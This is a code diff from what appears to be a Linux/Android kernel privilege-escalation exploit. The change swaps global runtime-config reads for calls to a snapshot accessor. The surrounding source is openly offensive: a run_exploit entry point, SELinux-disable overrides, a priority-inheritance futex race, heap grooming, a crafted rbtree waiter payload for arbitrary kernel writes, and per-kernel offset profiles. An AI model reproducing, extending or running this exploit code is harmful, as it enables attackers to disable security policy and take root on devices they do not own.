@@ -23,8 +23,8 @@
 // Input: const session config; output: paths without process-global aliases.
 // Retained because victim/handoff orchestration remains centralized in main;
 // the aliases expose stable c_str() pointers only at syscall/exec boundaries.
-#define g_home_dir (g_runtime_config.home_dir.c_str())
-#define g_root_script_path (g_runtime_config.root_script_path.c_str())
+#define g_home_dir (runtime_config_snapshot().home_dir.c_str())
+#define g_root_script_path (runtime_config_snapshot().root_script_path.c_str())
 
 /* Override target.h _OFF macros with the resolved runtime profile. */
 #undef SELINUX_ENFORCING_OFF
@@ -160,14 +160,14 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
 }
 
 static void log_execution_settings(const struct kernel_offsets *profile) {
-    if (!profile || !g_runtime_config.verbose_debug) return;
+    if (!profile || !runtime_config_snapshot().verbose_debug) return;
     const struct execution_settings *e = &profile->execution;
 #define LOG_EXEC(key, value) pr_info("debug.execution.%s=%u\n", key, (unsigned)(value))
     pr_info("debug.execution.begin release=%s\n", profile->uname_r);
     LOG_EXEC("recommended_cpus.main", e->recommended_main_cpu);
     LOG_EXEC("recommended_cpus.consumer", e->recommended_consumer_cpu);
-    LOG_EXEC("selected_cpus.main", g_runtime_config.main_cpu);
-    LOG_EXEC("selected_cpus.consumer", g_runtime_config.consumer_cpu);
+    LOG_EXEC("selected_cpus.main", runtime_config_snapshot().main_cpu);
+    LOG_EXEC("selected_cpus.consumer", runtime_config_snapshot().consumer_cpu);
     LOG_EXEC("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
     LOG_EXEC("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
     LOG_EXEC("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
@@ -257,9 +257,9 @@ static int select_offsets(const char *profile_path) {
     if (validate_offsets_profile(&decoded) != 0) return -1;
     g_target_profile = target_profile_snapshot(&decoded);
     pr_success("resolved profile loaded: %s\n", PROFILE_VALUES->uname_r);
-    if (runtime_config_apply_profile(&g_runtime_config, &g_target_profile) != 0)
+    if (runtime_config_apply_profile(&runtime_config_snapshot(), &g_target_profile) != 0)
         return -1;
-    runtime_config_log(&g_runtime_config);
+    runtime_config_log(&runtime_config_snapshot());
     log_execution_settings(PROFILE_VALUES);
     if (resolve_profile_addresses() != 0) {
         pr_error("cannot resolve profile address space\n");
@@ -448,7 +448,7 @@ void reset_main_route_state(void) {
     int fast_repair = atomic_load(&g_pi_race_context.fast_repair);
     g_pi_race_context.reset(
             fast_repair ? 5000 : (int) execution_settings()->select_enter_delay_us,
-            g_runtime_config.main_cpu, g_runtime_config.consumer_cpu);
+            runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
     atomic_store(&g_pi_race_context.fast_repair, fast_repair);
 }
 
@@ -606,7 +606,7 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
      * relink: waiter words are {pc = value, right = 0, left = target} and
      * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
     if (kernel5_route_selected() &&
-            g_runtime_config.multicast_resident_enabled) {
+            runtime_config_snapshot().multicast_resident_enabled) {
         if (!kernel5_resident_start()) {
             pr_warning("5.x resident multicast setup failed\n");
             return 0;
@@ -1371,7 +1371,7 @@ int run_exploit(int argc, char **argv) {
     signal(SIGPIPE, SIG_IGN);
     set_limit();
     reserve_standard_io();
-    if (runtime_config_init(&g_runtime_config) != 0) {
+    if (runtime_config_init(&runtime_config_snapshot()) != 0) {
         pr_error("runtime configuration failed errno=%d\n", errno);
         return 1;
     }
@@ -1384,13 +1384,13 @@ int run_exploit(int argc, char **argv) {
     apply_iomem_cache();
     log_startup_context();
     init_p0_profile();
-    pin_to_core(g_runtime_config.main_cpu);
+    pin_to_core(runtime_config_snapshot().main_cpu);
     pr_info("main thread running on cpu=%d\n", sched_getcpu());
 
     timer_reset();
     TIMER("exploit start");
 
-    if (g_runtime_config.multicast_phase1_probe) {
+    if (runtime_config_snapshot().multicast_phase1_probe) {
         if (!kernel5_route_selected()) {
             pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
             return 1;
@@ -1412,7 +1412,7 @@ int run_exploit(int argc, char **argv) {
         TIMER("pre-W1 drain");
         int w1_attempts = (int) execution_settings()->w1_attempts;
         if (kernel5_route_selected() &&
-                !g_runtime_config.multicast_resident_enabled)
+                !runtime_config_snapshot().multicast_resident_enabled)
             w1_attempts = 1; /* one-shot route cannot safely retry a missed W1 */
         selinux_ok = retry_write_stage(
                 "W1: SELinux",
@@ -1426,7 +1426,7 @@ int run_exploit(int argc, char **argv) {
             return 1;
         }
         if (kernel5_route_selected() &&
-                !g_runtime_config.multicast_resident_enabled) {
+                !runtime_config_snapshot().multicast_resident_enabled) {
             uintptr_t w1_scratch_poison =
                     page_base + PROFILE_VALUES->mcast_buffer_size;
             if (!quarantine_reclaim_sockets()) {
@@ -1456,7 +1456,7 @@ int run_exploit(int argc, char **argv) {
             }
         }
         if (kernel5_route_selected() &&
-                g_runtime_config.multicast_resident_enabled) {
+                runtime_config_snapshot().multicast_resident_enabled) {
             uintptr_t repair =
                     (resolved_addresses_data_alias(
                             &g_resolved_addresses,
@@ -1473,7 +1473,7 @@ int run_exploit(int argc, char **argv) {
             }
         }
         TIMER("Write 1 complete");
-        if (g_runtime_config.w1_only) {
+        if (runtime_config_snapshot().w1_only) {
             pr_success("W1-only diagnostic complete\n");
             return 0;
         }
